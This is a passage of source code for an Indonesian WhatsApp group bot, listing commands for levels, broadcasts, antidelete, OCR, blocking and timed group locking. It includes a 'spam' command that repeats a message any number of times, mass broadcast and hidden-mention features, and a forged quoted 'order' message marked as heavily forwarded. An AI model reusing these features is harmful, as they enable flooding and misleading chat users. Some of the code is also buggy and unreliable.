client.sendMessage(from, wew, image, {thumbnail:fs.readFileSync(`lib/logo.jpg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`lib/logobot.jpg`),"itemCount":1,"status":"INQUIRY","surface":"CATALOG","message":`©Bot WhatsApp`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},caption: lzain,contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
break

		case 'donasi':
		case 'donate':
					
                 if (!isRegistered) return reply( ind.noregis())
					client.sendMessage(from, donasi(), text)
					break
		case 'level':
                 if (!isRegistered) return reply( ind.noregis())
					if (!isLevelingOn) return reply(ind.lvlnoon())
					if (!isGroup) return reply(ind.groupo())
					const userLevel = getLevelingLevel(sender)
					const userXp = getLevelingXp(sender)
					if (userLevel === undefined && userXp === undefined) return reply(ind.lvlnul())
					const requiredXp = 5000 * (Math.pow(2, userLevel) - 1)
					resul = `◪ *LEVEL*\n  ├─ ❏ *Name* : ${pushname}\n  ├─ ❏ *Nomor* : ${sender.split("@")[0]}\n  ├─ ❏ *User XP* : ${userXp}/${requiredXp}\n  └─ ❏ *User Level* : ${userLevel}\n`
					client.sendMessage(from, resul, text, { quoted: mek})
					.catch(async (err) => {
					console.error(err)
					await reply(`Error!\n${err}`)
					})
					break
		case 'info':
					me = client.user
					uptime = process.uptime()
					teks = `*INFO OWNER*\n*Owner bot* : ${FN}\n*No Owner* : wa.me/6283106733687\n*Ig owner* :-\n━━━━━━━━━━━━━━━━━━━━\n*INFO BOT*\n*Nama bot* : ${me.name}\n*Nomor bot* : @${me.jid.split('@')[0]}\n*Prefix* : ${prefix}\n*Total block contact* : ${blocked.length}\n*The bot is active on* : ${kyun(uptime)}\n*Ketik* : ${prefix}lpr _Untuk melaporkan admin bot melalui bot_\n*Ketik* : ${prefix}owner untuk menghubungi admin bot kami.`
					buffer = await getBuffer(me.imgUrl)
					client.sendMessage(from, buffer, image, {caption: teks, contextInfo:{mentionedJid: [me.jid]}})
					break
		case 'infobot':
		if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply(ind.baned())
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
				me = client.user
				uptime = process.uptime()
				teks = `*INFO BOT*\n\n⍟ ────────────────── ⍟\n❏ *Prefix :* ${prefix}\n❏ *Nama bot :* ${me.name}\n❏ *Nomor bot :* @${me.jid.split('@')[0]}\n❏ *Run :* Termux\n❏ *Total block :* ${blocked.length}\n❏ *Server :* ${client.browserDescription[0]}\n❏ *Browser :* ${client.browserDescription[1]}\n❏ *Version :* ${client.browserDescription[2]}\n❏ *Os Version :* ${client.user.phone.os_version}\n❏ *Penggunaan Ram :* ${ram2}\n❏ *MNC :* ${client.user.phone.mnc}\n❏ *MCC :* ${client.user.phone.mcc}\n❏ *Hostname :* ${os.hostname()}\n❏ *Platform :* ${os.platform()}\n❏ *Handphone* : ${client.user.phone.device_manufacturer}\n❏ *Device Model* : ${client.user.phone.device_model}\n❏ *Versi wa* : ${client.user.phone.wa_version}\n❏ *Speed* : ${process.uptime()} _milidetik_\n❏ *Waktu proses* : ${kyun(uptime)}\n⍟ ────────────────── ⍟`
				buffer = await getBuffer(`https://i.ibb.co/wQcvdKg/7955e041aea0.jpg`)
				client.sendMessage(from, buffer, image, {caption: teks, contextInfo:{mentionedJid: [me.jid]}})
				break
		case 'spam':
		if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply(ind.baned())
				if (!args) return aqul.reply(from, `Penggunaan ${prefix}spam teks|jumlahspam`, qul)
				argz = args.split("|")
				if (!argz) return aqul.reply(from, `Penggunaan ${prefix}spam teks|jumlah`, qul)
				if (isNaN(argz[1])) return aqul.reply(from, `harus berupa angka`, qul)
				for (let i = 0; i < argz[1]; i++){
					aqul.sendText(from, argz[0])
				}
				break
		case 'rules':
					me = client.user
					uptime = process.uptime()
					teks = `*Syarat & Ketentuan Reneasy-Bot*\n1. Teks dan nama pengguna WhatsApp anda kami simpan di dalam server selama bot aktif.\n2. Data anda akan di hapus ketika bot offline.\n3. Kami tidak menyimpan gambar, video, file, audio, dan dokumen yang anda kirim.\n4. Kami tidak pernah meminta anda untuk memberikan informasi pribadi.\n5. Jika menemukan Bug/Error silahkan langsung lapor ke Owner bot.\n6. Cukup perintah 1x jika bot tidak merespon harap ulangi kembali, Jika di ulangi kembali tidak merespon, Bot tidak aktif\n7. Dilarang spam, Share virus virtex, Telpon, Video call, Kami akan blockir anda.\n8. Apapun yang anda perintah pada bot ini, *KAMI TIDAK BERTANGGUNG JAWAB!*\n\nTERIMA KASIH !~`
					buffer = await getBuffer(me.imgUrl)
					client.sendMessage(from, buffer, image, {caption: teks, contextInfo:{mentionedJid: [me.jid]}})
					break
		case 'lpr':
		if (!isRegistered) return reply( ind.noregis())
					const bug = body.slice(5)
					if (pesan.length > 300) return client.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', msgType.text, {quoted: mek})
					var nomor = mek.participant
					teks1 = `*[LAPORAN]*\nNomor : @${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${bug}`
					var options = {
					text: teks1,
					contextInfo: {mentionedJid: [nomor]},
					}
					client.sendMessage('6283106733687@s.whatsapp.net', options, text, {quoted: mek})
					reply('Masalah telah di laporkan ke owner. Laporan palsu atau main² tidak akan ditanggapi.')
					break
					case 'antidelete':
					
					if (!isGroup) return reply(ind.groupo())
					
					if (!isGroupAdmins) return reply(ind.admin())
				
				const dataRevoke = JSON.parse(fs.readFileSync('./src/gc-revoked.json'))
				
				const dataCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked.json'))
				
				const dataBanCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked-banlist.json'))
				
				const isRevoke = dataRevoke.includes(from)
				
				const isCtRevoke = dataCtRevoke.data
				
				const isBanCtRevoke = dataBanCtRevoke.includes(sender) ? true : false
				
				const argz = body.split(' ')
				
				if (argz.length === 1) return client.sendMessage(from, `Penggunaan fitur antidelete :\n\n*${prefix}antidelete [aktif/mati]* (Untuk grup)\n*${prefix}antidelete [ctaktif/ctmati]* (untuk semua kontak)\n*${prefix}antidelete banct 628558xxxxxxx* (banlist kontak)`, MessageType.text)
				
				if (argz[1] == 'aktif') {
				
					if (isGroup) {
					
						if (isRevoke) return client.sendMessage(from, `Antidelete telah diaktifkan di grup ini sebelumnya!`, MessageType.text)
						
						dataRevoke.push(from)
						
						fs.writeFileSync('./src/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
						
						client.sendMessage(from, `*Succes Enable Antidelete Grup!*`, MessageType.text)
						
					} else if (!isGroup) {
					
						client.sendMessage(from, `Untuk kontak penggunaan *${prefix}antidelete ctaktif*`, MessageType.text)
						
					}
					
				} else if (argz[1] == 'ctaktif') {
				
					if (!isGroup) {
					
						if (isCtRevoke) return client.sendMessage(from, `Antidelete telah diaktifkan di semua kontak sebelumnya!`, MessageType.text)
						
						dataCtRevoke.data = true
						
						fs.writeFileSync('./src/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
						
						client.sendMessage(from, `Antidelete diaktifkan disemua kontak!`, MessageType.text)
						
					} else if (isGroup) {
					
						client.sendMessage(from, `Untuk grup penggunaan *${prefix}antidelete aktif*`, MessageType.text)
						
					}
					
				} else if (argz[1] == 'banct') {
				
					if (isBanCtRevoke) return client.sendMessage(from, `kontak ini telah ada di database banlist!`, MessageType.text)
					
					if (argz.length === 2 || argz[2].startsWith('0')) return client.sendMessage(from, `Masukan nomer diawali dengan 62! contoh 62859289xxxxx`, MessageType.text)
					
					dataBanCtRevoke.push(argz[2] + '@s.whatsapp.net')
					
					fs.writeFileSync('./src/ct-revoked-banlist.json', JSON.stringify(dataBanCtRevoke, null, 2))
					
					client.sendMessage(from, `Kontak ${argz[2]} telah dimasukan ke banlist antidelete secara permanen!`, MessageType.text)
					
				} else if (argz[1] == 'mati') {
				
					if (isGroup) {
					
						const index = dataRevoke.indexOf(from)
						
						dataRevoke.splice(index, 1)
						
						fs.writeFileSync('./src/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
						
						client.sendMessage(from, `*Succes disable Antidelete Grup!*`, MessageType.text)
						
					} else if (!isGroup) {
					
						client.sendMessage(from, `Untuk kontak penggunaan *${prefix}antidelete ctmati*`, MessageType.text)
						
					}
					
				} else if (argz[1] == 'ctmati') {
				
					if (!isGroup) {
					
						dataCtRevoke.data = false
						
						fs.writeFileSync('./src/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
						
						client.sendMessage(from, `Antidelete dimatikan disemua kontak!`, MessageType.text)
						
					} else if (isGroup) {
					
						client.sendMessage(from, `Untuk grup penggunaan *${prefix}antidelete mati*`, MessageType.text)
						
					}
					
				}
				
				break
		case 'request':
		if (!isRegistered) return reply( ind.noregis())
					const cfrr = body.slice(8)
					if (cfrr.length > 300) return client.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', msgType.text, {quoted: mek})
					var nomor = mek.participant
					const ress = `*[REQUEST VITUR]*\nNomor : @${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${cfrr}`
							var options = {
							text: ress,
                         				contextInfo: {mentionedJid: [nomor]},
                     			}
					client.sendMessage('6283106733687@s.whatsapp.net', options, text, {quoted: mek})
					reply('REQUEST ANDA TELAH SAMPAI KE OWNER ARA REQUESTS PALSU ATAU MAIN² TIDAK AKAN DITANGGAPI.')
					break
		case 'blocklist': 
					teks = '*This is list of blocked number* :\n'
					for (let block of blocked) {
						teks += `*~>* @${block.split('@')[0]}\n`
					}
					teks += `*Total* : ${blocked.length}`
					client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": blocked}})
					break
					
                case 'hidetag':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					var value = body.slice(9)
					var group = await client.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					client.sendMessage(from, options, text)
					await limitAdd(sender)
					break

                case 'afk':
                                        tels = body.slice(4)
                                        if (args.length < 1) return reply('kakak afk karena apa?')
                                        if (!isRegistered) return reply(ind.noregis())
		if (isBanned) return reply(ind.baned())
                                        var num = mek.participant
                                        const fku = {
                                                text: `@${num.split("@s.whatsapp.net")[0]} *SEDANG AFK ${tels} JANGAN GANGGU YA*`,
                                                contextInfo: { mentionedJid: [num] }
                                        }
                                        client.sendMessage(from, fku, text, {quoted: mek})
				const afk = fs.readFileSync('./lib/logo.jpg');
                client.sendMessage(from, afk, MessageType.image, {quoted: mek, caption: '*KAKA INI  SEDANG AFK  JANGAN DI GANGGU YA!!*'})
                 break 
                                       break
				case 'unafk':
                                        tels = body.slice(4)
                                        if (args.length < 1) return reply('sukess!!?')
                                        var num = mek.participant
                                        const kl7 = {
                                                text: `@${numm.split("@s.whatsapp.net")[0]} *TELAH KEMBALI DARI AFK ${tels}*`,
                                                contextInfo: { mentionedJid: [num] }
                                        }
                                        client.sendMessage(from, kl7, text, {quoted: mek})
                                        break
                                        case 'profile':

    				client.updatePresence(from, Presence.composing)

				
    				try {

					ppimg = await client.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)

					} catch {

					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'

					}

					 profile = `╭─「 *PROFILE ANDA* 」\n│• *Name:* ${pushname}\n│• *XP:* ${getLevelingXp(sender)}\n│• *Level:* ${getLevelingLevel(sender)}\n│• *Role:* ${role}\n│• *User Terdaftar:* ✓\n│• *Link:* wa.me/${sender.split("@")[0]}\n╰──────────────────`

					buffer = await getBuffer(ppimg)

					client.sendMessage(from, buffer, image, {quoted: mek, caption: profile})

					break
   
		case 'ocr': 
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						reply(ind.wait())
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								reply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								reply(err.message)
								fs.unlinkSync(media)
							})
					} else {
						reply(`*Kirim foto dengan caption ${prefix}ocr*`)
					}
					await limitAdd(sender)
					break
		case 'setprefix':
					if (args.length < 1) return
					if (!isOwner) return reply(ind.ownerb())
					prefix = args[0]
					reply(`*Prefix berhasil di ubah menjadi* : ${prefix}`)
					break 
		case 'setlimit':
		case 'addlimit':
					if (args.length < 1) return
					if (!isOwner) return reply(ind.ownerb())
					limitawal = args[0]
					reply(`*Limit berhasil di ubah menjadi* : ${limitawal}`)
					break 
		case 'setlimitt':
		case 'addlimitt':
					if (args.length < 1) return
				if (!isAdmin) return reply('*Only Admin bot*')
					limitawal = args[0]
					reply(`*Limit berhasil di ubah menjadi* : ${limitawal}`)
					break 
		case 'setmemlimit':
					if (args.length < 1) return
					if (!isOwner) return reply(ind.ownerb())
					if (isNaN(args[0])) return reply('Limit harus angka')
					memberlimit = args[0]
					reply(`Change Member limit To ${memberlimit} SUCCESS!`)
					break 
		case 'setmemlimitt':
					if (args.length < 1) return
				if (!isAdmin) return reply('*Only Admin bot*')
					if (isNaN(args[0])) return reply('Limit harus angka')
					memberlimit = args[0]
					reply(`Change Member limit To ${memberlimit} SUCCESS!`)
					break 
		
                 case 'linkgc':
                 if (!isRegistered) return reply( ind.noregis())
				if (!isGroup) return reply(ind.groupo())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (!isBotGroupAdmins) return reply(ind.badmin())
				linkgc = await client.groupInviteCode (from)
				yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
				client.sendMessage(from, yeh, text, {quoted: mek})
				await limitAdd(sender)
				break
                case 'add':
                if (!isRegistered) return reply( ind.noregis())
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('Yang mau di add siapa??')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara Gan')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						client.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					break
		case 'bot':
					client.sendMessage(from, 'Ada kak 😉"',MessageType.text, { quoted: mek} )
					break
		case 'wa.me':
		case 'wame':
  					
                 if (!isRegistered) return reply( ind.noregis())
  					if (isLimit(sender)) return reply(ind.limitend(pusname))
  					client.updatePresence(from, Presence.composing) 
  					options = {
  					text: `「 *SELF WHATSAPP* 」\n\n_Request by_ : *@${sender.split("@s.whatsapp.net")[0]}\n\nYour link WhatsApp : *https://wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*Or ( / )*\n*https://api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,
  					contextInfo: { mentionedJid: [sender] }
  					}
  					client.sendMessage(from, options, text, { quoted: mek } )
  					break
  					if (data.error) return reply(data.error)
  					reply(data.result)
					await limitAdd(sender)
  					break
		case 'tagall':
		if (!isRegistered) return reply( ind.noregis())
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `*~>* @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break
		case 'clearall':
					if (!isOwner) return reply(ind.ownerb())
					anu = await client.chats.all()
					client.setMaxListeners(25)
					for (let _ of anu) {
						client.deleteChat(_.jid)
					}
					reply(ind.clears())
					break
					case 'readall':
					if (!isOwner) return reply(ind.ownerb())
					var chats = await client.chats.all()
					chats.map( async ({ jid }) => {
					await client.chatRead(jid)
					})
					rdl = `${a}Berhasil membaca ${chats.length} Chat !${a}`
					await client.sendMessage(from, rdl, MessageType.text, {quoted: mek})
					console.log(chats.length)
					break
					case 'tebakgambar':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isBanned) return reply(ind.baned())
				anu = await fetchJson(`https://api.zeks.xyz/api/tebakgambar?apikey=${ZeksApi}`, {method: 'get'})
				const tbkgm = await getBuffer(anu.result.soal)
				tebak = `➸ Jawaban : *${anu.result.jawaban}*`
				setTimeout( () => {
				client.sendMessage(from, tebak, text, {quoted: mek})
				}, 60000) // 1000 = 1s,
				setTimeout( () => {
				client.sendMessage(from, '_10 Detik lagi..._', text) // ur cods
				}, 50000) // 1000 = 1s,
				setTimeout( () => {
				client.sendMessage(from, '_20 Detik lagi..._', text) // ur cods
				}, 40000) // 1000 = 1s,
				setTimeout( () => {
				client.sendMessage(from, '_30 Detik lagi..._', text) // ur cods
				}, 30000) // 1000 = 1s,
				setTimeout( () => {
				client.sendMessage(from, '_40 Detik lagi..._', text) // ur cods
				}, 20000) // 1000 = 1s,
				setTimeout( () => {
				client.sendMessage(from, '_50 Detik lagi..._', text) // ur cods
				}, 10000) // 1000 = 1s,
				setTimeout( () => {
				client.sendMessage(from, '_60 Detik lagi..._', text) // ur cods
				}, 2500) // 1000 = 1s,
				setTimeout( () => {
				client.sendMessage(from, tbkgm, MessageType.image, { caption: '_Tebak bro!!! gak bisa jawab donasi ya:v_', quoted: mek }) // ur cods
				}, 0) // 1000 = 1s,
				await limitAdd(sender) 
				break
				case 'nulis':  
                   if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply(ind.baned())
			       await limitAdd(sender)	
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Reneasy cantik*`)
                   F = body.slice(7)
                   reply(ind.wait)
                   anu = await getBuffer(`https://api.zeks.xyz/api/nulis?text=${F}&apikey=Alphabott`)
                   client.sendMessage(from, anu, image, {caption: 'Ati ati ketahuan >_<', quoted: mek})
                   break
                    case 'toimg':
                    if (!isRegistered) return reply(ind.noregis())
			     	if (!isQuotedSticker) return reply('Reply/tag sticker !')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('Eror Kak')
						buffer = fs.readFileSync(ran)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih kak... '})
						fs.unlinkSync(ran)
					})
					break
            /*case 'stickergif':
			case 'stikergif':
			case 'sgif':
			if (!isRegistered) return reply(ind.noregis())
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.stick)
							})
							.on('end', function () {
								console.log('Subrek Fernazer')
								buffer = fs.readFileSync(ran)
								client.sendMessage(from, buffer, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						reply(mess.wait)
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(ind.stikga())
							})
							.on('end', function () {
								console.log('Finish')
								buffer = fs.readFileSync(ran)
								client.sendMessage(from, buffer, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
							} else {
						reply(`Kirim gambar dengan caption ${prefix}sticker atau reply/tag gambar`)
					}
					break*/
		case 'blockk':
				 client.updatePresence(from, Presence.composing) 
				 client.chatRead (from)
					if (!isGroup) return reply(ind.groupo())
				if (!isAdmin) return reply('*Only Admin bot*')
					client.blockUser (`${body.slice(8)}@c.us`, "add")
					client.sendMessage(from, `*Perintah Diterima, Memblokir* ${body.slice(7)}@c.us`, text)
					break
		case 'unblockk':
					if (!isGroup) return reply(ind.groupo())
				if (!isAdmin) return reply('*Only Admin bot*')
				    client.blockUser (`${body.slice(10)}@c.us`, "remove")
					client.sendMessage(from, `*Perintah Diterima, Membuka Blockir* ${body.slice(9)}@c.us`, text)
					break
		case 'block':
				 client.updatePresence(from, Presence.composing) 
				 client.chatRead (from)
					if (!isGroup) return reply(ind.groupo())
					if (!isOwner) return reply(ind.ownerb())
					client.blockUser (`${body.slice(7)}@c.us`, "add")
					client.sendMessage(from, `*Perintah Diterima, Memblokir* ${body.slice(7)}@c.us`, text)
					break
		case 'unblock':
					if (!isGroup) return reply(ind.groupo())
					if (!isOwner) return reply(ind.ownerb())
				    client.blockUser (`${body.slice(9)}@c.us`, "remove")
					client.sendMessage(from, `*Perintah Diterima, Membuka Blockir* ${body.slice(9)}@c.us`, text)
					break
		case 'leave':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (!isGroup) return reply(ind.groupo())
					if (!isOwner) return reply(ind.ownerb())
					setTimeout( () => {
					client.groupLeave (from) 
					}, 2000)
					setTimeout( () => {
					client.updatePresence(from, Presence.composing) 
					client.sendMessage(from, 'Bye cuk🗣', text) // ur cods
					}, 0)
					break
		case 'bc': 
					if (!isOwner) return reply(ind.ownerb()) 
					if (args.length < 1) return reply('.......')
					anu = await client.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buffer = await client.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							client.sendMessage(_.jid, buffer, image, {caption: `*「 PESAN BROADCAST 」*\n\nDari : Owner\nPengirim : wa.me/${(sender.split('@')[0])}\nPesan : ${body.slice(4)}`})
						}
						reply('*SUCCESS BROADCAST* ')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*「Ini Broadcast」*\n\n${body.slice(4)}`, text, { contextInfo: {"forwardingScore":508,"isForwarded":true}})
						}
						reply('*SUCCESS BROADCAST* ')
					}
			break
					/*case 'bc':  
        case 'broadcast':  
                  if (!isOwner) return reply(ind.ownerb()) 
					if (args.length < 1) return reply('.......')
					ini_bc = args.join(' ')
					anu = await client.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					buff = await client.downloadMediaMessage(encmedia)
					for (let _ of anu) {
						client.sendMessage(_.jid, buff, image, {quoted:fkontak ,caption: `「  *BROADCAST* 」\n\n${ini_bc}`})
					}
					reply('```Success Broadcast```')
					} else {
					for (let _ of anu) {
					client.sendMessage(_.jid, `   *「Ini Broadcast」*\n\n  ${ini_bc}\n`, text, { contextInfo: {"forwardingScore":508,"isForwarded":true},sendEphemeral: true, thumbnail: fs.readFileSync('./lib/logo.jpg', 'base64')})
					}
					reply('```Success Broadcast```')
					}
					break*/
		case 'bcc': 
				if (!isAdmin) return reply('*Only Admin bot*')
					if (args.length < 1) return reply('.......')
					anu = await client.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await client.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							client.sendMessage(_.jid, buff, image, {caption: `*「 RENEASY BROADCAST 」*\n\n${body.slice(4)}`})
						}
						reply('*Suksess broadcast* ')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*「 BROADCAST ${namabot} 」*\n\n${body.slice(4)}`)
						}
						reply('*Suksess broadcast* ')
					}
					break			
					case 'bcs': 
					if (!isOwner) return reply(ind.ownerb()) 
					if (args.length < 1) return reply('.......')
					anu = await client.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buffer = await client.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							client.sendMessage(_.jid, buffer, image, {caption: `${body.slice(5)}`})
						}
						reply('*Suksess broadcast* ')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(5)}`)
						}
						reply('*Suksess broadcast* ')
					}
			break
			case 'listonline': 
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isBanned) return reply(ind.baned())
				let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
				let online = [...Object.keys(client.chats.get(ido).presences), client.user.jid]
				client.sendMessage(from, 'List Online Grup:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join`\n`, text, { quoted: mek,
				contextInfo: { mentionedJid: online }
				})
				await limitAdd(sender)
			break 
			case 'setppbot':
					if (!isOwner) return reply(ind.ownerb())
					client.updatePresence(from, Presence.composing) 
					if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
					enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(enmedia)
					await client.updateProfilePicture(botNumber, media)
					reply('Hore Reneasy ppnya balu😚')
			break 
			//BUKA TUTUP GC PAKAI WAKTU
			case 'buka10m':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				setTimeout( () => {
					reply(`*BERHASIL MEMBUKA GROUP*`)
					client.groupSettingChange(from, GroupSettingChange.messageSend, false)
					}, 600000)
					setTimeout( () => {
					client.sendMessage(from, '10 menit grup ini akan Reneasy buka', text)
					}, 2500)
					setTimeout( () => {
					client.sendMessage(from, 'Dalam waktu 10 menit grup ini akan Reneasy buka', text)
					}, 0)
			break
			case 'tutup10m':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				setTimeout( () => {
					reply(`*BERHASIL MENUTUP GROUP*`)
					client.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}, 600000)
					setTimeout( () => {
					client.sendMessage(from, '10 menit grup ini akan Reneasy tutup', text)
					}, 2500)
					setTimeout( () => {
					client.sendMessage(from, 'Dalam waktu 10 menit grup ini akan Reneasy tutup', text)
					}, 0)
			break
			case 'buka20m':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply(ind.badmin())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
					setTimeout( () => {
					reply(`*BERHASIL MEMBUKA GROUP*`)
